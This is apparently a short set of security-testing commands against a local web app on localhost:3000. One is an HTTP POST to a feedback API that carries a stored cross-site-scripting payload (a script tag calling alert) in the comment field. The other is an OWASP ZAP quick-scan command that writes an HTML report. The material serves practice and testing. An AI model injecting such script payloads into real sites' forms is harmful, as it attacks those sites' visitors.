POST "http://localhost:3000/api/Feedbacks" \
  -H "Content-Type: application/json" \
  -d '{"captchaId":"1","captcha":"12345","comment":"<script>alert(\"XSS\")</script>","rating":5}'

zap.sh -cmd -quickurl http://localhost:3000 -quickprogress -quickout zap_report.html
